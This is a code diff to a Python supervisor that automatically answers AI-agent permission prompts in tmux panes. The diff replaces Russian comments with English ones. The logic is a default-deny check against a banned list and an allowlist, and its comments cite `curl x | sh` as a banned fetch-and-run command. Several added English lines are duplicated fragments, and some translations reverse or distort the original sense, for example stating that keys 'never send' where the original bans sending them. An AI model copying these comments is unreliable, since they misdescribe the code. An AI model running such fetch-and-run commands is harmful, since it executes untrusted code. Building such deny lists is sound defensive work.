-    а внутри кавычек не трогаются (`echo \"a && b\"` — один сегмент).
-    Редиректы (`>`, `2>`, `>>`) остаются внутри сегмента: они не начинают
-    новую команду, а принадлежат текущей. Строка, которая не разбирается
-    (незакрытая кавычка), возвращается целиком одним сегментом —
-    неразобранное не подтверждаем косвенно, его разберёт построчный матчинг.
+    Parsed via shlex in punctuation_chars mode: `;`, `&&`, `||`, `|` and `&` split
+    into standalone tokens even without spaces (`pytest;rm`, `a||b`), untouched
+    inside quotes (`echo \"a && b\"` is one segment). Redirects (`>`, `2>`, `>>`)
+    stay inside the segment: they start no new command but belong to the current
+    one. A line that never parses (an unclosed quote) returns whole as one segment —
+    the unparsed never confirms indirectly; line matching parses it.
     """
     try:
         lexer = shlex.shlex(prompt, posix=True, punctuation_chars=True)
@@ -1219,18 +1216,18 @@ def split_command_segments(prompt: str) -> list[str]:
     return [seg for seg in segments if seg]
 
 
-# Паттерны запуска тестов на хосте (P0): их не применяем к сегменту,
-# который идёт через изолированный раннер — команда выполнится
-# в контейнере без сети и без $HOME, а не от прав оператора.
-# Остальные NEVER (сеть, секреты, sudo) действуют и там: контейнер
-# не лечит `curl x | sh` внутри тестовой команды.
+# Host test-runner patterns (P0): never applied to the segment running through
+# the isolated runner — the command executes in a container with no network and
+# no $HOME, not with operator rights. The rest of NEVER (network, secrets, sudo)
+# still holds there: the container never cures `curl x | sh` inside a test command.
+# holds there too: the container never cures `curl x | sh` inside a test command.
 TEST_RUNNER_NEVER = (
     r"\bpytest\b",
-    # Интерпретатор с test-аргументом: `python3 -m pytest`, `node --test`.
-    # Ключевое слово обязано быть АРГУМЕНТОМ (как в allow-паттерне), иначе
-    # хватит «test» в комментарии. Прямой `python3 path/to/test_*.py` этим
-    # паттерном не ловится (слово не в конце токена) — честная граница regex:
-    # полный разбор argv вне P0-скоупа, ограничение зафиксировано в THREAT_MODEL.
+    # Interpreter with a test arg: `python3 -m pytest`, `node --test`. The keyword must
+    # be an ARGUMENT (as in the allow pattern), or the word "test" in a comment
+    # suffices. A direct `python3 path/to/test_*.py` escapes this pattern (word not at
+    # token end) — the honest regex edge: a full argv parse sits past the P0 scope,
+    # the limit pinned in THREAT_MODEL.
     r"\b(?:python3?|node|ruby)\s+(?:-\S+\s+)*(?:[^\s]*[_./-]?)(?:test|tests|pytest|unittest)\b",
     r"\b(?:jest|vitest|mocha|rspec|nox|tox|nose|unittest)\b",
     r"\b(?:cargo\s+test|go\s+test)\b",
@@ -1239,28 +1236,26 @@ TEST_RUNNER_NEVER = (
 ISOLATED_RUNNER = r"\brun-isolated-test\.sh\b"
 
 def permission_verdict(prompt: str, allow: list[str] | None = None) -> dict:
-    """Можно ли сверхвизору без человека нажать «y» на этом промпте.
+    """Whether the supervisor may press "y" on this prompt with no human.
 
-    Default-deny, и запрет проверяется раньше разрешения. Цена двух ошибок не
-    симметрична: зависший агент стоит одной ночи, а подтверждённая опасная
-    команда уничтожает то, что нельзя вернуть.
+    Default-deny, and the ban checks before the allow. The two error prices never
+    match: a hung agent costs one night, while a confirmed dangerous command
+    destroys the unreturnable.
 
-    Отказ возвращается с причиной: его читает человек, а необъяснённое «нет»
-    неотличимо от сломанного сверхвизора.
+    A refusal returns with a cause: the human reads it, and an unexplained "no"
+    never differs from a broken supervisor.
 
-    Строка разбирается на сегменты по шелл-разделителям вне кавычек
-    (см. split_command_segments): каждый сегмент проверяется отдельно, и
-    вердикт — худший из сегментов. Составная команда подтверждается, только
-    если безопасен КАЖДЫЙ её кусок: `pytest && echo ok` — allow, а
-    `pytest && curl x | sh` — refuse. Кавычки разбираются честно:
-    `echo \"a && b\"` — один сегмент, а не два.
+    The line splits into segments on shell separators outside quotes (see
+    split_command_segments): every segment checks apart, and the verdict is the
+    worst of the segments. A compound command confirms only when EVERY piece is
+    safe: `pytest && echo ok` allows, while `pytest && curl x | sh` refuses. Quotes
+    parse honestly: `echo \"a && b\"` is one segment, not two.
 
-    Запуск тестов на хосте запрещён (P0): сегмент с тестовым раннером —
-    refuse, если он не идёт через изолированный раннер
-    (scripts/run-isolated-test.sh): там команда выполнится в контейнере
-    без сети и без $HOME, а не от прав оператора. Остальные NEVER (сеть,
-    секреты, sudo) действуют и внутри раннера: контейнер не лечит
-    `curl x | sh` внутри тестовой команды.
+    Host test runs are banned (P0): a segment with a test runner refuses unless it
+    rides the isolated runner (scripts/run-isolated-test.sh): there the command runs
+    in a container with no network and no $HOME, not with operator rights. The rest
+    of NEVER (network, secrets, sudo) holds inside the runner too: the container
+    never cures `curl x | sh` inside a test command.
     """
     patterns = DEFAULT_ALLOW_PATTERNS if allow is None else tuple(allow)
     segments = split_command_segments(prompt)
@@ -1271,7 +1266,7 @@ def permission_verdict(prompt: str, allow: list[str] | None = None) -> dict:
                 continue
             if re.search(pattern, segment, re.IGNORECASE):
                 return {"verdict": "refuse", "matched": pattern,
-                        "why": f"запрещённая категория (§12): {pattern}"}
+                        "why": f"banned category (§12): {pattern}"}
     for segment in segments:
         matched_any = False
         for pattern in patterns:
@@ -1280,8 +1275,8 @@ def permission_verdict(prompt: str, allow: list[str] | None = None) -> dict:
                 break
         if not matched_any:
             return {"verdict": "refuse", "matched": None,
-                    "why": "не в белом списке разрешений"}
-    return {"verdict": "allow", "matched": None, "why": "в белом списке"}
+                    "why": "not on the permission allowlist"}
+    return {"verdict": "allow", "matched": None, "why": "on the allowlist"}
 def resolve_permission_prompt(tmux: str, pane: str, allow: list[str] | None = None) -> dict:
     """Check if the pane is stalled waiting for a permission confirmation and confirm it.
 
@@ -1291,7 +1286,7 @@ def resolve_permission_prompt(tmux: str, pane: str, allow: list[str] | None = No
     """
     idle = {"approved": False, "verdict": "none", "prompt": "", "why": "", "matched": None}
     if not pane_alive(tmux, pane):
-        return {**idle, "why": "панель мертва"}
+        return {**idle, "why": "pane dead"}
     lines = capture(tmux, pane)
     menu = detect_permission_menu(lines)
     prompt = menu or detect_permission_prompt(lines)
@@ -1299,19 +1294,19 @@ def resolve_permission_prompt(tmux: str, pane: str, allow: list[str] | None = No
         return idle
 
     if menu:
-        # В меню нет строки ввода, и жать «y» там бессмысленно: у этого TUI
-        # «y» не значит согласие, а подтверждение — Enter по выбранному пункту.
-        # Проверять композер нечего: его там просто нет, и это нормально.
+        # No input line lives in a menu, and "y" there means nothing: for this TUI "y"
+        # never means agreement — confirmation is Enter on the selected item.
+        # Nothing to check the composer for: none stands there at all, and that is fine.
         context = extract_permission_context(lines, prompt)
     else:
         line = composer_line(lines)
-        # Нет композера — значит и печатать некому: молча подтверждать нельзя.
+        # No composer means nobody to type to: silently confirming is banned.
         if line is None:
             return {**idle, "prompt": prompt, "verdict": "refuse",
-                    "why": "композера не видно, подтверждать нечем"}
+                    "why": "no composer visible, nothing to confirm with"}
         if not detect_permission_prompt([line]) and not is_composer_empty(line):
             return {**idle, "prompt": prompt, "verdict": "refuse",
-                    "why": "строка ввода занята своим текстом"}
+                    "why": "the input line holds its own text"}
         context = extract_permission_context(lines, prompt)
 
     decision = permission_verdict(context, allow)
@@ -1320,12 +1315,12 @@ def resolve_permission_prompt(tmux: str, pane: str, allow: list[str] | None = No
                 "why": decision["why"], "matched": decision["matched"]}
 
     if menu:
-        # Меню бывает двух видов. Горизонтальное (`⇆ select`) — Enter жмёт
-        # выделенный пункт, там первым стоит Allow once, и это работало.
-        # Нумерованное (`1) Allow once`) — Enter жмёт ДЕФОЛТ, а им может быть
-        # Deny: тогда разрешённая операция молча отклонялась. Цифру шлём,
-        # только когда пункт явно разрешающий и вердикт уже allow — см.
-        # menu_allow_key. Нет цифры — прежнее поведение, без угадывания.
+        # Menus run two kinds. Horizontal (`⇆ select`): Enter presses the selected item,
+        # with Allow once first, and that worked. Numbered (`1) Allow once`): Enter presses
+        # the DEFAULT, possibly Deny: then an allowed op silently refused. The digit sends
+        # only when the item explicitly allows and the verdict is allow already — see
+        # menu_allow_key. No digit means the old behaviour, no guessing.
+        # menu_allow_key. Without a digit the old behaviour holds, no guessing.
         key = menu_allow_key(lines)
         keys = [key, "Enter"] if key else ["Enter"]
         for key in keys:
@@ -1342,31 +1337,31 @@ def resolve_permission_prompt(tmux: str, pane: str, allow: list[str] | None = No
 
 
 def deliver(pane: str, text: str, wait_for_empty: float = 0.0, submit: bool = True) -> dict:
-    """Доставить текст в композер соседа. Возвращает отчёт, что реально вышло.
+    """Deliver text into the neighbour composer. Returns a report of what happened.
 
-    Бросает ComposerBusy, если композер занят — вбивать поверх чужого текста
-    нельзя, это потеряет то, что человек печатает.
+    Raises ComposerBusy when the composer is busy — typing over another text is
+    banned: it loses what the human types.
     """
     tmux = _tmux()
     if not pane_alive(tmux, pane):
-        raise ComposerBusy("панель мертва или отсутствует")
+        raise ComposerBusy("pane dead or missing")
 
     deadline = time.monotonic() + max(0.0, wait_for_empty)
     while True:
         line = composer_line(capture(tmux, pane))
-        # None — композер не виден вовсе. Это не «свободно»: печатать некуда,
-        # и отправлять клавиши мимо композера нельзя.
+        # None means no composer visible at all. Not "free": nowhere to type, and keys
+        # past the composer never send.
         if line is not None and is_composer_empty(line):
             break
         if time.monotonic() >= deadline:
-            seen = line.strip()[-60:] if line else "композер не виден"
-            raise ComposerBusy("композер занят: " + (seen or "?"))
+            seen = line.strip()[-60:] if line else "no composer visible"
+            raise ComposerBusy("composer busy: " + (seen or "?"))
         time.sleep(0.5)
 
     body = " ".join(text.split())
     type_text(tmux, pane, body)
 
-    # Проверка вставки несколькими чтениями, а не одним.
+    # The paste check over several reads, not one.
     landed = False
     for attempt in range(VERIFY_ATTEMPTS):
         if tail_present(capture(tmux, pane), body):
@@ -1375,9 +1370,9 @@ def deliver(pane: str, text: str, wait_for_empty: float = 0.0, submit: bool = Tr
         if attempt + 1 < VERIFY_ATTEMPTS:
             time.sleep(VERIFY_PAUSE)
     if composer_overflowed(capture(tmux, pane)):
-        # Текст на экране, просто хвост свёрнут. Объявлять «не доставил» здесь
-        # нельзя: это и есть двойной след — сообщение в ящике И текст в композере
-        # одновременно, и именно это путает человека.
+        # Text on screen, just the tail collapsed. Calling it "undelivered" here is banned:
+        # the double trace — a mailbox message AND composer text at once — is exactly what
+        # confuses the human.
         result = {"delivered": True, "chars": len(body),
                   "chunks": len(chunks(body)), "pane": pane, "submitted": submit,
                   "tail_hidden": True}
@@ -1386,19 +1381,19 @@ def deliver(pane: str, text: str, wait_for_empty: float = 0.0, submit: bool = Tr
                            capture_output=True, text=True, timeout=5)
         return result
     if not landed:
-        # Не подтверждено — значит НЕИЗВЕСТНО, дошёл ли текст, а не «не дошёл».
-        # Стирать вслепую нельзя: erase(len(body)) не знает, чей это ввод, и
-        # съедает текст соседа или человека, печатавшего в этой же панели. Прежний
-        # откат на одном устаревшем кадре именно это и делал — и рапортовал
-        # «откатил» при тексте, который лежал на экране.
+        # Unconfirmed means UNKNOWN whether the text landed, not "it never did".
+        # Blind erasing is banned: erase(len(body)) never knows whose input it is, eating
+        # the neighbour or human text typed in the same pane. The old rollback on one stale
+        # frame did exactly that — reporting "rolled back" over text lying on screen.
+        # frame did exactly that — reporting rolled-back over text lying on screen.
         #
-        # Цена ошибки несимметрична: лишнее сообщение в ящике стоит одного взгляда,
-        # стёртый ввод соседа — его работы. Поэтому сомнение передаётся дальше, и
-        # вызывающий уходит в ящик, где сообщение точно будет прочитано.
+        # The error price runs asymmetric: an extra mailbox message costs one glance, while
+        # a wiped neighbour input costs its work. So doubt travels on, and the caller leaves
+        # for the mailbox, where the message is surely read.
         return {"delivered": False, "unverified": True, "chars": len(body),
                 "pane": pane, "submitted": submit,
-                "why": "вставка не подтвердилась на экране; композер мог остаться с текстом, "
-                       "откат вслепую не делаю — забери сообщение из ящика"}
+                "why": "the paste never confirmed on screen; the composer may keep text, "
+                       "never rolling back blind — take the message from the mailbox"}
 
     result = {"delivered": True, "chars": len(body), "chunks": len(chunks(body)),
               "pane": pane, "submitted": submit}
